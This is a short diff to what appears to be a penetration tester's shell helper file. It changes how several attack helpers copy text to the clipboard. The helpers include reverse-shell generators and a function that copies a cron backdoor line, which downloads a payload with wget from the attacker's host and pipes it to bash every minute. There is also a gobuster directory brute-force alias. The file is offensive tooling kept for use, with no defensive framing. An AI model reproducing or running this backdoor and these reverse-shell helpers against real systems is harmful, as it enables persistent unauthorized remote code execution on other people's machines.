@@ -99,7 +99,7 @@ sett() {
 
 gett() {
   echo "$tip"
-  setclip "$tip"
+  echo "$tip" | setclip
 }
 
 genrev() {
@@ -113,7 +113,7 @@ genrev() {
 
 genrevc() {
   revshell="$(genrev $@)"
-  echo "$revshell" && setclip "$revshell"
+  echo "$revshell" && echo "$revshell" | setclip
 }
 
 revpayload() {
@@ -122,7 +122,7 @@ revpayload() {
 }
 
 bdcron() {
-  setclip "* * * * * /usr/bin/wget -O- http://$(getip):8000/payload | /bin/bash"
+  echo "* * * * * /usr/bin/wget -O- http://$(getip):8000/payload | /bin/bash" | setclip
 }
 
 alias gob="gobuster dir -w /usr/share/dirbuster/directory-list-2.3-medium.txt -o gobuster.log -u"
